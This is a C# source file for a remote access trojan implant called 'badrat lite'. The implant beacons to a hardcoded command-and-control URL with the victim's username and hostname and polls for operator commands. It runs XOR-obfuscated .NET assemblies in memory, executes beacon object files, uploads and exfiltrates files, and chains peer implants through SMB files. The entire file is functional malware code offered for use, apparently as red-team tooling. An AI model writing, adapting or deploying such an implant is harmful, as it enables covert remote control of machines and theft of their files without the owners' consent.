using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Reflection;
using System.IO;
using System.Security.Principal;
using System.Net;
using System.Net.Http;
using Newtonsoft.Json.Linq;
using System.Collections;


// C# badrat lite. No process injection or powershell. Just dotnet assemblies, BOFs, and internal commands like linking agents

// You also need to install the Newtonsoft.Json package from the NuGet package manager included with visual studio
namespace ConsoleApp
{
    public class Program
    {
        readonly static string type = "c#l";
        readonly static int sleepytime = 2000;
        readonly static string id = new Random().Next().ToString();
        readonly static string un = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
        readonly static string hn = Dns.GetHostName();

        public static class Globl
        {
            public static string[] HOME = new string[1];
        }

        private static byte[] Zor(byte[] input, byte[] key)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return mixed;
        }

        private static string RunAssembly(byte[] assemblyBytes, string argumentString)
        {

            string Delimeter = "\",\""; // split on quote comma quote ( "," )
            argumentString = argumentString.Trim('"'); //Remove leading and trailing quotes
            string[] assemblyArgs = argumentString.Split(new[] { Delimeter }, StringSplitOptions.None);


            if (argumentString == "  ")
            {
                assemblyArgs = null;
            }
            bool foundMain = false;
            bool execMain = false;
            Assembly assembly = null;

            try
            {
                assembly = Assembly.Load(assemblyBytes);
            }
            catch (Exception e)
            {
                return "[!] Could not load assembly. Error caught:\n" + e.ToString();
            }

            // Get all types in the assembly
            Type[] types = assembly.GetExportedTypes();

            // Run through each type (aka class), finding methods contained within
            foreach (Type type in types)
            {
                // Get all methods in the type
                MethodInfo[] methods = type.GetMethods();

                // Run through each method, searching for Main method (aka function)
                foreach (MethodInfo method in methods)
                {
                    if (method.Name == "Main")
                    {
                        foundMain = true;
                        if (!type.Attributes.HasFlag(TypeAttributes.Abstract))
                        {
                            execMain = true;

                            //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                            TextWriter prevConOut = Console.Out;
                            var sw = new StringWriter();
                            Console.SetOut(sw);

                            object instance = Activator.CreateInstance(type);
                            // https://stackoverflow.com/questions/3721782/parameter-count-mismatch-with-invoke
                            if (argumentString == "  ")
                            {
                                string[] empty = new string[0];
                                method.Invoke(instance, new object[] { empty }); // Runs the main function without args
                            }
                            else
                            {
                                method.Invoke(instance, new object[] { assemblyArgs }); // Runs the main function with args
                            }

                            //Restore output -- Stops redirecting output
                            Console.SetOut(prevConOut);
                            var output = sw.ToString();

                            return (string)output;
                        }
                    }
                }
            }
            if (!foundMain)
            {
                return "[!] No public \"Main()\" function found in assembly. Did you make sure to set the class as public?";
            }
            else if (!execMain)
            {
                return "[!] Found public \"Main()\" function but could not execute it. Make your assembly's CPU arch matches this program.";
            }
            else
            {
                return "[!] Unexpected error occured";
            }

        }

        public static string Post(string home, string resp, HttpClient client) // handles HTTP and SMB post
        {
            string json = null;
            if (home.StartsWith("http")) // http post
            {
                HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;
                string serverMsg = postResults.Content.ReadAsStringAsync().Result;
                json = "{" + string.Join("{", serverMsg.Split('{').Skip(1).ToArray()).Split('\n')[0];

            }
            else // SMB file post
            {
                if (!File.Exists(home))
                {
                    File.WriteAllText(home, "");
                }
                string updata = File.ReadAllText(home);
                if (updata == "" || updata != resp)
                {
                    json = updata;
                    File.WriteAllText(home, resp);
                }
            }
            return json;
        }
        public static void Main(string[] args)
        {
            string home;
            string uri;
            string host;
            string retval = string.Empty;
            byte[] retdata = null;
            string rettype;
            string cmnd;

            if (args.Length == 0)
            {
                host = "http://172.16.113.1:8080";
                uri = "/status.aspx";
                home = host + uri;
            }
            else
            {
                home = args[0];
            }
            Globl.HOME[0] = home;

            HttpClient client = new HttpClient();
            //specify to use TLS 1.2 as default connection
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            JObject jsObject = new JObject();
            ArrayList links = new ArrayList();
            string resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";

            while (true)
            {
                try
                {
                    string jString = Post(home, resp, client);

                    if (jString == null || jString == "")
                    { // smb post is the same as it was last time ... pass
                        Thread.Sleep(sleepytime);
                        continue;
                    }

                    resp = "{\"p\":[ "; // start building response
                    bool recv_package = false;

                    // check linked peers
                    if (links.Count > 0)
                    {
                        foreach (string link in links)
                        {
                            try
                            {
                                string updata = null;
                                updata = File.ReadAllText(link);
                                if (updata != jString)
                                {
                                    JObject updata_dict = JObject.Parse(updata);
                                    resp += string.Join(",", updata_dict["p"]).ToString().Replace("\r", "").Replace("\n", "").Replace(" ", "") + ","; //add peer packages to the response
                                    File.WriteAllText(link, jString); //write data back to the linked file
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                    jsObject = JObject.Parse(jString);
                    jString = null;

                    foreach (var package in jsObject["p"])
                    {
                        if (package["id"].ToString() == id)
                        {
                            recv_package = true;
                            cmnd = package["cmnd"].ToString();
                            if (cmnd != "") // If cmnd is not empty string ("")
                            {
                                rettype = "retval";

                                if (cmnd == "quit")
                                {
                                    return;
                                }
                                else if (cmnd.Split(' ')[0] == "cs")
                                {
                                    //Run a C Sharp executable (aka assembly)
                                    //cs <base64_encoded_assembly> "arg1","arg2","third arg"
                                    string b64Assembly = cmnd.Split(' ')[1];
                                    //Cuts off the first two elements of cmnd (cs and <b64assembly>) and returns a string array
                                    string argumentString = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray()); //Equiv to args = " ".join(cmnd.split(" ")[2:])
                                    retval = RunAssembly(Zor(Convert.FromBase64String(b64Assembly), Encoding.UTF8.GetBytes(id)), argumentString);

                                }
                                else if (cmnd.Split(' ')[0] == "bof")
                                {
                                    var items = cmnd.Split(' ');
                                    const string function = "go";
                                    string data = items[1];
                                    string arg_data = "AAAAAA==";
                                    if (items.Length > 2)
                                    {
                                        arg_data = items[2];
                                    }
                                    var loader = new ConsoleApp.COFFLoader();
                                    retval = loader.RunCoff(function, data, arg_data);
                                }
                                else if (cmnd.Split(' ')[0] == "dl")
                                {
                                    //Download a file -- Send a file from the rat to the server
                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                                    filename = Path.GetFullPath(filename);
                                    try
                                    {
                                        retdata = File.ReadAllBytes(filename);
                                        rettype = "dl";
                                    }
                                    catch
                                    {
                                        rettype = "retval";
                                        retval = "[-] Could not read file " + filename;
                                    }
                                }
                                else if (cmnd.Split(' ')[0] == "up")
                                {
                                    //Upload a file -- Send a file from the server to the rat
                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray());
                                    filename = Path.GetFullPath(filename);
                                    try
                                    {
                                        byte[] content = Convert.FromBase64String(cmnd.Split(' ')[1]);

                                        File.WriteAllBytes(filename, content);
                                        retval = "[+] File uploaded: " + filename;
                                    }
                                    catch
                                    {
                                        retval = "[-] Could not write file " + filename;
                                    }
                                }
                                else if (cmnd.Split(' ')[0] == "li") // link
                                {
                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                                    if (!links.Contains(filename))
                                    {
                                        links.Add(filename);
                                        retval = "[*] Added link to: " + filename;
                                    }
                                }
                                else if (cmnd.Split(' ')[0] == "ul")
                                {
                                    //Download a file -- Send a file from the rat to the server
                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                                    if (links.Contains(filename))
                                    {
                                        links.Remove(filename);
                                        retval = "[*] Removed link to: " + filename;
                                    }
                                    else if (filename == "all")
                                    {
                                        links.Clear();
                                        Console.WriteLine("num of links: " + links.Count);
                                        foreach (var link in links)
                                        {
                                            Console.WriteLine(link);
                                        }
                                        retval = "[*] Removed all links";
                                    }
                                    else
                                    {
                                        retval = "[!] No such link to remove: " + filename;
                                    }
                                }
                                else if (cmnd.StartsWith("cd "))
                                {
                                    string directory = "";
                                    try
                                    {
                                        directory = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                                        Directory.SetCurrentDirectory(directory);
                                        retval = "Dir changed: " + directory;
                                    }
                                    catch
                                    {
                                        retval = "Failed to set dir: " + directory;
                                    }
                                }
                                else
                                {
                                    retval = "cmd not found: " + cmnd;
                                }

                                // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
                                if (rettype == "dl")
                                {
                                    resp += "{ \"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"} ] }";
                                }
                                else
                                {
                                    if (retval == "")
                                    {
                                        retval = "[*] No output returned";
                                    }
                                    resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"} ] }";
                                }
                            }
                            else
                            {
                                resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
                            }
                        }

                        retval = string.Empty;
                        cmnd = string.Empty;
                    }
                    if (!recv_package)
                    {
                        resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
                    }
                    Thread.Sleep(sleepytime);
                }

                catch (Exception ex)
                {
                    resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }"; // case something goes wrong
                    Console.WriteLine(ex.Message);
                    Thread.Sleep(sleepytime);
                }
            }
        }
    }
}
